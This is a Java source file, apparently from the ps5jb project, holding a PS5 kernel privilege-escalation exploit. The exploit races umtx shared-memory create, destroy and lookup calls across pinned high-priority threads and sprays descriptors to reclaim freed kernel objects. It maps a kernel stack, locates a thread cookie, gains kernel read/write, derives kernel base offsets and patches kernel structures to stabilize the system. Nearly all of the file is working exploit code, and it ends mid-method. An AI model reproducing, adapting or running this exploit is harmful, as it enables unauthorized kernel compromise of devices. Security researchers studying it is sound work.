package org.ps5jb.client.payloads.umtx.impl2;

import org.ps5jb.sdk.include.sys.pthreadtypes.PThreadType;
import org.ps5jb.sdk.include.PThreadNp;
import org.ps5jb.sdk.include.PThread;
import org.ps5jb.client.payloads.umtx.common.CommandProcessor;
import java.util.concurrent.atomic.AtomicBoolean;
import org.ps5jb.loader.Status;
import org.ps5jb.sdk.core.kernel.KernelAccessorIPv6;
import java.util.Collection;
import org.ps5jb.client.payloads.umtx.common.KernelStabilizer;
import org.ps5jb.client.payloads.umtx.common.KernelAddressClassifier;
import org.ps5jb.client.payloads.umtx.common.KernelOffsetsCalculator;
import org.ps5jb.sdk.core.SdkRuntimeException;
import org.ps5jb.sdk.core.SdkException;
import org.ps5jb.loader.KernelAccessor;
import org.ps5jb.loader.KernelReadWrite;
import org.ps5jb.client.payloads.umtx.common.KernelAccessorSlow;
import org.ps5jb.sdk.core.kernel.KernelPointer;
import org.ps5jb.sdk.core.AbstractPointer;
import org.ps5jb.client.payloads.umtx.common.MemoryDumper;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.HashSet;
import org.ps5jb.client.payloads.umtx.common.DebugStatus;
import java.util.Set;
import org.ps5jb.sdk.core.Pointer;
import org.ps5jb.sdk.lib.LibKernel;

public class UmtxExploitJob implements Runnable
{
    private LibKernel mainLibKernel;
    private static final int UMTX_OP_SHM = 26;
    private static final int UMTX_SHM_CREAT = 1;
    private static final int UMTX_SHM_LOOKUP = 2;
    private static final int UMTX_SHM_DESTROY = 4;
    private static final int CPU_SETSIZE = 16;
    private static final int CPU_LEVEL_WHICH = 3;
    private static final int CPU_WHICH_TID = 1;
    private static final short RTP_PRIO_REALTIME = 2;
    private static final int RTP_SET = 1;
    private static final int OFFSET_STAT_SIZE = 72;
    private static final int PROT_READ = 1;
    private static final int PROT_WRITE = 2;
    private static final int MAP_SHARED = 1;
    static short MAIN_THREAD_CORE;
    static final short MAIN_THREAD_PRIO = 256;
    static short[] DESTROYER_THREAD_CORE;
    static final short[] DESTROYER_THREAD_PRIO;
    static short LOOKUP_THREAD_CORE;
    static final short LOOKUP_THREAD_PRIO = 767;
    static short KPRIM_THREAD_CORE;
    static final short KPRIM_THREAD_PRIO = 0;
    private static final int NUM_RACE_ATTEMPTS = 65536;
    private static int SPRAY_FDS_PER_THREAD;
    private Pointer shmKey;
    private Pointer fstatBuf;
    private int ourPid;
    volatile int numRaceAttemts;
    private Set mappedKernelStackAddresses;
    private Set usedDescriptors;
    private Pointer pipeTestFds;
    private int pipeTestReadFd;
    private int pipeTestWriteFd;
    private Pointer pipeTestScratchBuf;
    public volatile boolean finished;
    private static int NUM_KPRIM_ATTEMPTS;
    private static int NUM_KPRIM_THREADS;
    private KPrimThreadData kPrimThreadData;
    private KPrimJob[] kPrimJobs;
    private Thread[] kPrimThreads;
    
    public UmtxExploitJob() {
        this.mainLibKernel = new LibKernel();
        this.numRaceAttemts = 0;
        this.pipeTestReadFd = -1;
        this.pipeTestWriteFd = -1;
        this.finished = false;
    }
    
    static int pinToCoreSelf(final int core, final LibKernel libKernel) {
        final Pointer mask = Pointer.calloc(16L);
        try {
            final int byteIdx = core / 8;
            final int bitIdx = core % 8;
            mask.write1(byteIdx, (byte)(1 << bitIdx));
            return libKernel.cpuset_setaffinity(3, 1, -1L, 16L, mask);
        }
        finally {
            mask.free();
        }
    }
    
    static int setRtprioSelf(final short value, final LibKernel libkernel) {
        final Pointer prio = Pointer.calloc(4L);
        try {
            prio.write2((short)2);
            prio.write2(2L, value);
            return libkernel.rtprio_thread(1, 0, prio);
        }
        finally {
            prio.free();
        }
    }
    
    private static int UmtxShmCreate(final Pointer key, final LibKernel libkernel) {
        return libkernel._umtx_op(Pointer.NULL, 26, 1L, key, Pointer.NULL);
    }
    
    private static int UmtxShmDestroy(final Pointer key, final LibKernel libkernel) {
        return libkernel._umtx_op(Pointer.NULL, 26, 4L, key, Pointer.NULL);
    }
    
    private static int UmtxShmLookup(final Pointer key, final LibKernel libkernel) {
        return libkernel._umtx_op(Pointer.NULL, 26, 2L, key, Pointer.NULL);
    }
    
    private static int ShmResizeTag(final int fd, final LibKernel libkernel) {
        return libkernel.ftruncate(fd, fd * 16384L);
    }
    
    private static int ShmClose(final int fd, final LibKernel libkernel) {
        return libkernel.close(fd);
    }
    
    private int GetShmTag(final int fd, final LibKernel libkernel) {
        final int returnCode = libkernel.fstat(fd, this.fstatBuf);
        if (returnCode != 0) {
            return returnCode;
        }
        long tag = this.fstatBuf.read8(72L) / 16384L;
        if (tag != (tag & 0x3FFL)) {
            tag = fd;
        }
        return (int)tag;
    }
    
    public int prepare() {
        int returnCode = 0;
        this.shmKey = Pointer.calloc(4096L);
        this.fstatBuf = Pointer.calloc(256L);
        returnCode = pinToCoreSelf(UmtxExploitJob.MAIN_THREAD_CORE, this.mainLibKernel);
        if (returnCode < 0) {
            DebugStatus.error("[-] Failed to pin main thread, returnCode: " + returnCode);
            return returnCode;
        }
        returnCode = setRtprioSelf((short)256, this.mainLibKernel);
        if (returnCode < 0) {
            DebugStatus.error("[-] Failed to set main thread prio, returnCode: " + returnCode);
            return returnCode;
        }
        if (DebugStatus.isNoticeEnabled()) {
            DebugStatus.notice("[+] Main thread on cpu: " + this.mainLibKernel.sceKernelGetCurrentCpu());
        }
        this.ourPid = this.mainLibKernel.getpid();
        DebugStatus.info("[+] pid: " + this.ourPid);
        this.mappedKernelStackAddresses = (Set)new HashSet();
        this.usedDescriptors = (Set)new HashSet();
        this.pipeTestFds = Pointer.calloc(8L);
        returnCode = this.mainLibKernel.pipe(this.pipeTestFds);
        if (returnCode < 0) {
            DebugStatus.error("[-] Failed to create test pipe, returnCode: " + returnCode);
            return returnCode;
        }
        this.pipeTestReadFd = this.pipeTestFds.read4();
        this.pipeTestWriteFd = this.pipeTestFds.read4(4L);
        this.pipeTestScratchBuf = Pointer.calloc(65536L);
        this.kPrimPrepare();
        return 0;
    }
    
    public void cleanup() {
        if (this.shmKey != null) {
            this.shmKey.free();
        }
        if (this.fstatBuf != null) {
            this.fstatBuf.free();
        }
        if (this.pipeTestFds != null) {
            this.pipeTestFds.free();
        }
        if (this.pipeTestReadFd != -1) {
            this.mainLibKernel.close(this.pipeTestReadFd);
        }
        if (this.pipeTestWriteFd != -1) {
            this.mainLibKernel.close(this.pipeTestWriteFd);
        }
        if (this.pipeTestScratchBuf != null) {
            this.pipeTestScratchBuf.free();
        }
    }
    
    public RaceResult race() {
        final Sychronizer destroyerLookupSync = new Sychronizer(3);
        final AtomicInteger destructionsCounter = new AtomicInteger();
        final AtomicInteger lookupFd = new AtomicInteger();
        int reclaimFd = -1;
        final DestroyerJob[] destroyerJobs = new DestroyerJob[2];
        final Thread[] destroyerThreads = new Thread[2];
        for (int i = 0; i < 2; ++i) {
            destroyerJobs[i] = new DestroyerJob("destroyer[" + i, UmtxExploitJob.DESTROYER_THREAD_CORE[i], UmtxExploitJob.DESTROYER_THREAD_PRIO[i], destroyerLookupSync, destructionsCounter, lookupFd, this.shmKey, this.shmKey.inc(8 * (UmtxExploitJob.SPRAY_FDS_PER_THREAD * i + 1)));
            destroyerThreads[i] = new Thread((Runnable)destroyerJobs[i]);
        }
        for (int i = 0; i < 2; ++i) {
            destroyerThreads[i].start();
        }
        final LookupJob lookupJob = new LookupJob("lookup", UmtxExploitJob.LOOKUP_THREAD_CORE, (short)767, destroyerLookupSync, lookupFd, this.shmKey);
        final Thread lookupThread = new Thread((Runnable)lookupJob);
        lookupThread.start();
        int numDC2 = 0;
        int numSprays = 0;
        for (int attempt = 0; attempt < 65536; ++attempt) {
            ++this.numRaceAttemts;
            if (this.numRaceAttemts % 200 == 0) {
                DebugStatus.error("[+] Race attempt " + this.numRaceAttemts);
            }
            final int descriptor = UmtxShmCreate(this.shmKey, this.mainLibKernel);
            if (DebugStatus.isTraceEnabled()) {
                DebugStatus.trace("[+] created descriptor " + descriptor);
            }
            int returnCode = ShmResizeTag(descriptor, this.mainLibKernel);
            if (DebugStatus.isTraceEnabled()) {
                DebugStatus.trace("[+] ShmResizeTag returned " + returnCode);
            }
            returnCode = ShmClose(descriptor, this.mainLibKernel);
            if (DebugStatus.isTraceEnabled()) {
                DebugStatus.trace("[+] ShmClose returned " + returnCode);
            }
            destroyerLookupSync.runWhenAllReady();
            destroyerLookupSync.waitAllDone();
            if (destructionsCounter.get() == 2) {
                ++numDC2;
                if (DebugStatus.isDebugEnabled()) {
                    DebugStatus.debug("[+] destructionsCounter: " + destructionsCounter.get());
                }
                if (lookupFd.get() != -1 && DebugStatus.isDebugEnabled()) {
                    DebugStatus.debug("[+] lookup succeeded, lookupFd: " + lookupFd.get());
                }
            }
            else {
                if (DebugStatus.isTraceEnabled()) {
                    DebugStatus.trace("[+] destructionsCounter: " + destructionsCounter.get());
                }
                if (lookupFd.get() == -1) {
                    DebugStatus.trace("[-] lookup failed");
                }
                else if (DebugStatus.isDebugEnabled()) {
                    DebugStatus.trace("[+] lookup succeeded, lookupFd: " + lookupFd.get());
                }
            }
            if (destructionsCounter.get() == 2 && lookupFd.get() != -1) {
                ++numSprays;
                DebugStatus.info("[+] destructionsCounter: " + destructionsCounter.get() + ", lookupFd: " + lookupFd.get());
                reclaimFd = this.GetShmTag(lookupFd.get(), this.mainLibKernel);
                if (DebugStatus.isDebugEnabled()) {
                    DebugStatus.debug("[+] reclaimFd: " + reclaimFd);
                }
                this.usedDescriptors.add((Object)new Integer(lookupFd.get()));
            }
            destructionsCounter.set(0);
            for (int j = 0; j < destroyerJobs.length; ++j) {
                for (int k = 0; k < destroyerJobs[j].sprayFds.length; ++k) {
                    final int sprayFd = destroyerJobs[j].sprayFds[k];
                    if (sprayFd != reclaimFd && sprayFd != -1 && sprayFd != 0) {
                        ShmClose(sprayFd, this.mainLibKernel);
                    }
                }
            }
            if (reclaimFd != -1 && reclaimFd != lookupFd.get()) {
                DebugStatus.info("[+] reclaimed: " + reclaimFd + " != " + lookupFd.get());
                DebugStatus.info("[+] Race succeeded, numAttempts: " + this.numRaceAttemts + ", numDC2: " + numDC2 + ", numSprays: " + numSprays);
                destroyerLookupSync.stop();
                return new RaceResult(attempt + 1, lookupFd.get(), reclaimFd);
            }
            reclaimFd = -1;
            if (lookupFd.get() != -1 && !this.usedDescriptors.contains((Object)new Integer(lookupFd.get()))) {
                if (DebugStatus.isTraceEnabled()) {
                    DebugStatus.trace("[+] closing not reclaimed lookupFd: " + lookupFd);
                }
                returnCode = ShmClose(lookupFd.get(), this.mainLibKernel);
                if (DebugStatus.isTraceEnabled()) {
                    DebugStatus.trace("[+] ShmClose(" + lookupFd + ") returned " + returnCode);
                }
            }
            if (attempt + 1 == 65536) {
                destroyerLookupSync.stop();
            }
            else {
                destroyerLookupSync.reset();
            }
        }
        if (DebugStatus.isDebugEnabled()) {
            DebugStatus.debug("[-] Race failed, numAttemts: " + this.numRaceAttemts + ", numDC2: " + numDC2 + ", numSprays: " + numSprays);
        }
        return new RaceResult(-1);
    }
    
    private void kPrimPrepare() {
        this.kPrimThreadData = new KPrimThreadData();
        this.kPrimJobs = new KPrimJob[UmtxExploitJob.NUM_KPRIM_THREADS];
        this.kPrimThreads = new Thread[UmtxExploitJob.NUM_KPRIM_THREADS];
        for (int i = 0; i < UmtxExploitJob.NUM_KPRIM_THREADS; ++i) {
            this.kPrimJobs[i] = new KPrimJob(i, UmtxExploitJob.KPRIM_THREAD_CORE, (short)0, this.kPrimThreadData);
        }
    }
    
    private boolean isMemoryReadable(final Pointer kstack, final LibKernel libkernel) {
        long returnCode = libkernel.write(this.pipeTestWriteFd, kstack, 1L);
        if (returnCode < 0L) {
            DebugStatus.error("[-] isMemoryReadable: failed to read from mem, errno: " + libkernel.__error().read4());
            return false;
        }
        returnCode = libkernel.read(this.pipeTestReadFd, this.pipeTestScratchBuf, returnCode);
        if (returnCode < 0L) {
            DebugStatus.error("[-] isMemoryReadable: failed to read from pipe, errno: " + libkernel.__error().read4());
        }
        return true;
    }
    
    private void stopBadKprimThreads(final int neo) {
        if (DebugStatus.isNoticeEnabled()) {
            DebugStatus.notice("[+] stopping kprim threads except " + neo);
        }
        this.kPrimThreadData.neo.set(neo);
        this.kPrimThreadData.neoFound.set(true);
        for (int i = 0; i < UmtxExploitJob.NUM_KPRIM_THREADS; ++i) {
            if (i != neo) {
                if (DebugStatus.isTraceEnabled()) {
                    DebugStatus.trace("[+] stopping kprim[" + i);
                }
                try {
                    this.kPrimThreads[i].join();
                }
                catch (final InterruptedException e) {
                    DebugStatus.error("[-] stopping kprim[" + i + "] failed");
                }
                if (DebugStatus.isTraceEnabled()) {
                    DebugStatus.trace("[+] stopped kprim[" + i);
                }
            }
            else {
                if (DebugStatus.isDebugEnabled()) {
                    DebugStatus.debug("[+] waiting for command processor to start");
                }
                while (this.kPrimJobs[i].commandProcessor == null) {
                    Thread.yield();
                }
            }
        }
        if (DebugStatus.isNoticeEnabled()) {
            DebugStatus.notice("[+] kprim threads stopped");
        }
    }
    
    public RWResult getRW(final int lookupFd, final int reclaimFd) {
        final int returnCode = ShmClose(reclaimFd, this.mainLibKernel);
        if (DebugStatus.isNoticeEnabled()) {
            DebugStatus.notice("[+] Closed reclaimFd, returnCode: " + returnCode);
        }
        Pointer kstack = this.mainLibKernel.mmap(Pointer.NULL, 16384L, 3, 1, lookupFd, 0L);
        if (kstack.addr() < 0L) {
            DebugStatus.error("[-] Unable to mmap lookupFd, kstack: " + kstack);
            return new RWResult(-1);
        }
        DebugStatus.info("[+] kstack: " + kstack);
        int neo = -1;
        for (int attempt = 0; attempt < UmtxExploitJob.NUM_KPRIM_ATTEMPTS; ++attempt) {
            final boolean lastAttempt = attempt + 1 == UmtxExploitJob.NUM_KPRIM_ATTEMPTS;
            this.kPrimThreadData.resetToDefaults();
            for (int i = 0; i < UmtxExploitJob.NUM_KPRIM_THREADS; ++i) {
                if (DebugStatus.isTraceEnabled()) {
                    DebugStatus.trace("[+] Starting kPrimThread[" + i);
                }
                this.kPrimJobs[i].resetToDefaults(lastAttempt);
                (this.kPrimThreads[i] = new Thread((Runnable)this.kPrimJobs[i])).start();
                if (DebugStatus.isTraceEnabled()) {
                    DebugStatus.trace("[+] Started kPrimThread[" + i);
                }
            }
            DebugStatus.info("[+] Started kprim threads. Attempt " + (attempt + 1) + " of " + UmtxExploitJob.NUM_KPRIM_ATTEMPTS);
            boolean kstackValid = false;
            while (this.kPrimThreadData.selectedOnceCounter.get() < UmtxExploitJob.NUM_KPRIM_THREADS) {
                this.mainLibKernel.usleep(500000L);
                DebugStatus.info("[+] Waiting for all threads to work at least once, current count: " + this.kPrimThreadData.selectedOnceCounter.get());
            }
            DebugStatus.info("[+] Checking kstack memory to be readable");
            if (!this.isMemoryReadable(kstack, this.mainLibKernel)) {
                if (lastAttempt) {
                    DebugStatus.info("[-] Memory still is not readable, unmapping");
                    if (this.mainLibKernel.munmap(kstack, 16384L) == -1) {
                        DebugStatus.error("[-] Failed to unmap memory after failure");
                    }
                    else {
                        kstack = Pointer.NULL;
                    }
                }
                else {
                    DebugStatus.info("[+] Memory is not readable, trying again");
                }
                this.stopBadKprimThreads(-1);
            }
            else {
                DebugStatus.info("[+] Checking kstack is not zeros");
                for (int j = 0; j < 4096; j += 8) {
                    final long test_qword = kstack.read8(12288 + j);
                    if (test_qword != 0L) {
                        kstackValid = true;
                        break;
                    }
                }
                if (kstackValid) {
                    DebugStatus.info("[+] kernel stack dump:");
                    MemoryDumper.dump(kstack.inc(12288L), 4096L, true);
                    DebugStatus.info("[+] looking for cookie");
                    int j = 12290;
                    while (j < 16384) {
                        final short dword = kstack.read2(j);
                        if (dword == 4919) {
                            DebugStatus.info("[+] cookie found at 0x" + Long.toHexString((long)j));
                            neo = kstack.read2(j - 2);
                            DebugStatus.info("[+] reclaim thread index " + neo);
                            final long potentialThreadOffset = j - 2 + 292;
                            if (potentialThreadOffset + 8L <= 16384L) {
                                final KernelPointer threadPtr = KernelPointer.valueOf(kstack.read8(potentialThreadOffset));
                                DebugStatus.info("[+] possible thread pointer: " + threadPtr);
                                break;
                            }
                            break;
                        }
                        else {
                            j += 2;
                        }
                    }
                    break;
                }
                DebugStatus.info("[-] Failed to reclaim with kernel stack, trying again");
                this.stopBadKprimThreads(-1);
            }
        }
        this.stopBadKprimThreads(neo);
        if (neo == -1) {
            DebugStatus.info("[-] Failed to reclaim with kernel stack, halting this race attempt");
        }
        else {
            try {
                KernelReadWrite.setAccessor((KernelAccessor)new KernelAccessorSlow(this.kPrimJobs[neo].commandProcessor, kstack));
            }
            catch (final SdkException | SdkRuntimeException | Error e) {
                neo = -1;
                this.stopBadKprimThreads(-1);
            }
        }
        if (!Pointer.NULL.equals(kstack) && neo == -1) {
            this.mappedKernelStackAddresses.add((Object)kstack);
        }
        return new RWResult(neo);
    }
    
    protected boolean calculateKernelOffsets(final KernelOffsetsCalculator calculator, final Pointer kstack) {
        final int swVer = this.mainLibKernel.getSystemSoftwareVersion();
        final KernelAddressClassifier classifier = KernelAddressClassifier.fromBuffer(new Pointer(kstack.addr() + 12288L, new Long(4096L)));
        return calculator.calculate(swVer, classifier, "reclaim#" + this.kPrimThreadData.neo.get());
    }
    
    protected void stabilize(final KernelOffsetsCalculator offsets, final int lookupFd) throws SdkException {
        final KernelStabilizer stabilizer = new KernelStabilizer();
        stabilizer.fixupKernelStack(offsets.threadAddress);
        DebugStatus.info("[+] kstack stabilized");
        final int closeRet = stabilizer.fixupSharedMemory(offsets.processOpenFilesAddress, lookupFd);
        DebugStatus.info("[+] open files stabilized; lookup fd close=" + closeRet);
        if (!this.usedDescriptors.isEmpty()) {
            this.usedDescriptors.remove((Object)new Integer(lookupFd));
            final int fixCount = stabilizer.fixUsedDescriptors(offsets.processOpenFilesAddress, (Collection)this.usedDescriptors);
            if (fixCount > 0) {
                DebugStatus.info("[+] found " + fixCount + " lingering shm descriptors");
            }
        }
        if (!this.mappedKernelStackAddresses.isEmpty()) {
            final int numFixes = stabilizer.fixupVmSpace(offsets.processAddress, (Collection)this.mappedKernelStackAddresses);
            if (numFixes > 0) {
                DebugStatus.info("[+] vm space stabilized; fixed " + numFixes + " entries");
            }
        }
    }
    
    public void postExploit(final int lookupFd, final int neo) {
        if (KernelReadWrite.getAccessor() instanceof KernelAccessorSlow) {
            final KernelAccessorSlow kaSlow = (KernelAccessorSlow)KernelReadWrite.getAccessor();
            try {
                final KernelOffsetsCalculator offsets = new KernelOffsetsCalculator();
                if (this.calculateKernelOffsets(offsets, kaSlow.getKstack())) {
                    try {
                        if (!KernelPointer.NULL.equals(offsets.processOpenFilesAddress)) {
                            KernelReadWrite.setAccessor((KernelAccessor)new KernelAccessorIPv6(offsets.processOpenFilesAddress, offsets.kernelAddressBase));
                            DebugStatus.info("[+] installed ipv6 based kernel r/w");
                            this.stabilize(offsets, lookupFd);
                            DebugStatus.info("[+] thread=" + offsets.threadAddress);
                            DebugStatus.info("[+] proc=" + offsets.processAddress);
                            DebugStatus.info("[+] ofiles=" + offsets.processOpenFilesAddress);
                            DebugStatus.info("[+] allproc=" + offsets.allProcAddress);
                            if (!KernelPointer.NULL.equals(offsets.kernelAddressBase)) {
                                DebugStatus.info("[+] kdata=" + offsets.kernelDataBase);
                                DebugStatus.info("[+] kbase=" + offsets.kernelAddressBase);
                            }
                            else {
                                DebugStatus.info("[-] kbase cannot be determined due to unknown offsets on the current firmware version. Address of allproc is saved in system property: org.ps5jb.client.KERNEL_DATA_POINTER");
                                System.setProperty("org.ps5jb.client.KERNEL_DATA_POINTER", Long.toString(offsets.allProcAddress.addr()));
                            }
                        }
                        else {
                            KernelReadWrite.setAccessor((KernelAccessor)null);
                        }
                    }
                    catch (final SdkException | RuntimeException | Error e) {
                        Status.printStackTrace("[-] unable to upgrade kernel accessor", e);
                        KernelReadWrite.setAccessor((KernelAccessor)null);
                    }
                }
                else {
                    DebugStatus.info("[-] failed to determine kernel addresses");
                    KernelReadWrite.setAccessor((KernelAccessor)null);
                }
                if (KernelReadWrite.getAccessor() == null) {
                    DebugStatus.info("[-] removing slow kernel accessor before exiting");
                }
                this.kPrimJobs[neo].signalExit();
                try {
                    this.kPrimThreads[neo].join();
                }
                catch (final InterruptedException ex) {}
            }
            finally {
                kaSlow.free();
            }
        }
        else {
            DebugStatus.error("[-] failed");
        }
    }
    
    public void run() {
        final int MAX_ATTEMPTS = 50;
        int lookupFd = -1;
        int neo = -1;
        for (int i = 1; i <= 50; ++i) {
            DebugStatus.error("[+] exploit attempt " + i);
            try {
                this.prepare();
                final RaceResult raceResult = this.race();
                RWResult rwResult = null;
                if (raceResult.returnCode == 0) {
                    rwResult = this.getRW(raceResult.lookupFd, raceResult.reclaimFd);
                }
                this.cleanup();
                if (rwResult != null && rwResult.returnCode != -1) {
                    DebugStatus.info("[+] slow kernel r/w obtained");
                    lookupFd = raceResult.lookupFd;
                    neo = rwResult.returnCode;
                    break;
                }
            }
            catch (final RuntimeException | Error e) {
                Status.printStackTrace("[-] unexpected runtime error", e);
            }
        }
        this.postExploit(lookupFd, neo);
        this.mainLibKernel.closeLibrary();
        this.finished = true;
    }
    
    static {
        UmtxExploitJob.MAIN_THREAD_CORE = 0;
        UmtxExploitJob.DESTROYER_THREAD_CORE = new short[] { 1, 2 };
        DESTROYER_THREAD_PRIO = new short[] { 256, 256 };
        UmtxExploitJob.LOOKUP_THREAD_CORE = 3;
        UmtxExploitJob.KPRIM_THREAD_CORE = -1;
        UmtxExploitJob.SPRAY_FDS_PER_THREAD = 40;
        UmtxExploitJob.NUM_KPRIM_ATTEMPTS = 2;
        UmtxExploitJob.NUM_KPRIM_THREADS = 256;
    }
    
    class Sychronizer
    {
        public AtomicBoolean runSignal;
        public AtomicBoolean resetSignal;
        public AtomicBoolean stopSignal;
        public AtomicInteger waitingReadyCounter;
        public AtomicInteger waitingStep2Counter;
        public AtomicInteger waitingResetCounter;
        private int numJobs;
        
        public Sychronizer(final int numJobs) {
            this.numJobs = numJobs;
            this.runSignal = new AtomicBoolean();
            this.resetSignal = new AtomicBoolean();
            this.stopSignal = new AtomicBoolean();
            this.waitingReadyCounter = new AtomicInteger();
            this.waitingStep2Counter = new AtomicInteger();
            this.waitingResetCounter = new AtomicInteger();
        }
        
        void runWhenAllReady() {
            while (this.waitingReadyCounter.get() != this.numJobs) {
                Thread.yield();
            }
            this.resetSignal.set(false);
            this.runSignal.set(true);
        }
        
        void waitStep2() {
            while (this.waitingStep2Counter.get() != this.numJobs) {
                Thread.yield();
            }
        }
        
        void waitAllDone() {
            while (this.waitingResetCounter.get() != this.numJobs) {
                Thread.yield();
            }
        }
        
        void stop() {
            this.stopSignal.set(true);
            this.reset();
        }
        
        void reset() {
            this.waitingReadyCounter.set(0);
            this.waitingStep2Counter.set(0);
            this.waitingResetCounter.set(0);
            this.runSignal.set(false);
            this.resetSignal.set(true);
        }
    }
    
    class SynchronizedRepeatableJob implements Runnable
    {
        protected LibKernel libkernel;
        protected String name;
        private short core;
        private short prio;
        private Sychronizer sync;
        
        public SynchronizedRepeatableJob(final String name, final short core, final short prio, final Sychronizer sync) {
            this.name = name;
            this.core = core;
            this.prio = prio;
            this.sync = sync;
            this.libkernel = new LibKernel();
        }
        
        public void run() {
            this.prepare();
            this.loop();
            this.cleanup();
            if (DebugStatus.isNoticeEnabled()) {
                DebugStatus.notice("[+] " + this.name + ": stopped");
            }
        }
        
        private void prepare() {
            if (DebugStatus.isDebugEnabled()) {
                DebugStatus.debug("[+] " + this.name + ": pinning thread to " + this.core);
            }
            int returnCode = UmtxExploitJob.pinToCoreSelf(this.core, this.libkernel);
            if (returnCode < 0) {
                DebugStatus.error("[-] " + this.name + ": failed to pin thread, returnCode: " + returnCode);
            }
            if (DebugStatus.isNoticeEnabled()) {
                DebugStatus.notice("[+] " + this.name + ": setting prio " + this.prio);
            }
            returnCode = UmtxExploitJob.setRtprioSelf(this.prio, this.libkernel);
            if (returnCode < 0) {
                DebugStatus.error("[-] " + this.name + ": failed to set prio, returnCode: " + returnCode);
            }
            if (DebugStatus.isNoticeEnabled()) {
                DebugStatus.notice("[+] " + this.name + ": prepared on cpu " + this.libkernel.sceKernelGetCurrentCpu());
            }
        }
        
        private void loop() {
            while (!this.sync.stopSignal.get()) {
                this.sync.waitingReadyCounter.incrementAndGet();
                while (!this.sync.runSignal.get()) {
                    Thread.yield();
                }
                if (DebugStatus.isTraceEnabled()) {
                    DebugStatus.trace("[+] " + this.name + ": work");
                }
                this.work();
                this.sync.waitingStep2Counter.incrementAndGet();
                this.sync.waitStep2();
                if (DebugStatus.isTraceEnabled()) {
                    DebugStatus.trace("[+] " + this.name + ": work2");
                }
                this.work2();
                this.sync.waitingResetCounter.incrementAndGet();
                if (DebugStatus.isTraceEnabled()) {
                    DebugStatus.trace("[+] " + this.name + ": waiting for reset");
                }
                while (!this.sync.resetSignal.get()) {
                    Thread.yield();
                }
                if (DebugStatus.isTraceEnabled()) {
                    DebugStatus.trace("[+] " + this.name + ": resetting");
                }
            }
            if (DebugStatus.isNoticeEnabled()) {
                DebugStatus.notice("[+] " + this.name + ": finished");
            }
        }
        
        protected void work() {
            Thread.yield();
        }
        
        protected void work2() {
            Thread.yield();
        }
        
        protected void cleanup() {
            this.libkernel.closeLibrary();
        }
    }
    
    class DestroyerJob extends SynchronizedRepeatableJob
    {
        private AtomicInteger destructionsCounter;
        private AtomicInteger lookupFd;
        private Pointer shmKey;
        private int[] sprayFds;
        private Pointer sprayShmKey;
        
        public DestroyerJob(final String name, final short core, final short prio, final Sychronizer sync, final AtomicInteger destructionsCounter, final AtomicInteger lookupFd, final Pointer shmKey, final Pointer sprayShmKey) {
            super(name, core, prio, sync);
            this.destructionsCounter = destructionsCounter;
            this.lookupFd = lookupFd;
            this.shmKey = shmKey;
            this.sprayFds = new int[UmtxExploitJob.SPRAY_FDS_PER_THREAD];
            this.sprayShmKey = sprayShmKey;
        }
        
        @Override
        protected void work() {
            final int result = UmtxExploitJob.UmtxShmDestroy(this.shmKey, this.libkernel);
            if (DebugStatus.isTraceEnabled()) {
                DebugStatus.trace("[+] " + this.name + ": destroyed, result: " + result);
            }
            if (result == 0) {
                this.destructionsCounter.incrementAndGet();
            }
        }
        
        @Override
        protected void work2() {
            if (this.destructionsCounter.get() == 2 && this.lookupFd.get() != -1) {
                for (int i = 0; i < UmtxExploitJob.SPRAY_FDS_PER_THREAD; ++i) {
                    final Pointer sprayFdKey = this.sprayShmKey.inc(i * 8L);
                    this.sprayFds[i] = UmtxExploitJob.UmtxShmCreate(sprayFdKey, this.libkernel);
                    if (DebugStatus.isTraceEnabled()) {
                        DebugStatus.trace("[+] " + this.name + ": created " + this.sprayFds[i]);
                    }
                    int returnCode = UmtxExploitJob.ShmResizeTag(this.sprayFds[i], this.libkernel);
                    if (DebugStatus.isTraceEnabled()) {
                        DebugStatus.trace("[+] " + this.name + ": resized, returnCode " + returnCode);
                    }
                    returnCode = UmtxExploitJob.UmtxShmDestroy(sprayFdKey, this.libkernel);
                    if (DebugStatus.isTraceEnabled()) {
                        DebugStatus.trace("[+] " + this.name + ": destroyed, returnCode " + returnCode);
                    }
                }
            }
        }
    }
    
    class LookupJob extends SynchronizedRepeatableJob
    {
        private AtomicInteger lookupFd;
        private Pointer shmKey;
        
        public LookupJob(final String name, final short core, final short prio, final Sychronizer sync, final AtomicInteger lookupFd, final Pointer shmKey) {
            super(name, core, prio, sync);
            this.lookupFd = lookupFd;
            this.shmKey = shmKey;
        }
        
        @Override
        protected void work() {
            final int result = UmtxExploitJob.UmtxShmLookup(this.shmKey, this.libkernel);
            if (DebugStatus.isTraceEnabled()) {
                DebugStatus.trace("[+] " + this.name + ": looked up, result: " + result);
            }
            this.lookupFd.set(result);
        }
    }
    
    public class RaceResult
    {
        public int returnCode;
        public int numTries;
        public int lookupFd;
        public int reclaimFd;
        
        public RaceResult(final int returnCode) {
            this.returnCode = returnCode;
        }
        
        public RaceResult(final int numTries, final int lookupFd, final int reclaimFd) {
            this.returnCode = 0;
            this.numTries = numTries;
            this.lookupFd = lookupFd;
            this.reclaimFd = reclaimFd;
        }
    }
    
    class KPrimThreadData
    {
        public AtomicBoolean neoFound;
        public AtomicInteger neo;
        public AtomicInteger selectedOnceCounter;
        
        KPrimThreadData() {
            this.neoFound = new AtomicBoolean();
            this.neo = new AtomicInteger();
            this.selectedOnceCounter = new AtomicInteger();
            this.resetToDefaults();
        }
        
        public void resetToDefaults() {
            this.neoFound.set(false);
            this.neo.set(-1);
            this.selectedOnceCounter.set(0);
        }
    }
    
    class KPrimJob implements Runnable
    {
        private LibKernel libkernel;
        private int id;
        private short core;
        private short prio;
        private KPrimThreadData threadData;
        private AtomicBoolean exitSignal;
        private boolean selectedOnce;
        private boolean lastAttempt;
        private long cookie;
        private Pointer cookieBuf;
        private Pointer timeoutBuf;
        private volatile CommandProcessor commandProcessor;
        
        public KPrimJob(final int id, final short core, final short prio, final KPrimThreadData threadData) {
            this.id = id;
            this.core = core;
            this.prio = prio;
            this.threadData = threadData;
            this.exitSignal = new AtomicBoolean();
            this.cookie = 322371584L + id << 32;
            this.libkernel = new LibKernel();
            this.cookieBuf = Pointer.calloc(256L);
            (this.timeoutBuf = Pointer.calloc(16L)).write8(0L);
            this.timeoutBuf.write8(8L, 500000L);
        }
        
        public void resetToDefaults(final boolean lastAttempt) {
            this.exitSignal.set(false);
            this.selectedOnce = false;
            this.lastAttempt = lastAttempt;
        }
        
        public void signalExit() {
            this.exitSignal.set(true);
            if (this.commandProcessor != null) {
                this.commandProcessor.cmd.set(3);
            }
        }
        
        public void run() {
            this.prepare();
            this.loop();
            if (this.lastAttempt) {
                this.cleanup();
            }
        }
        
        private void prepare() {
            if (this.core >= 0) {
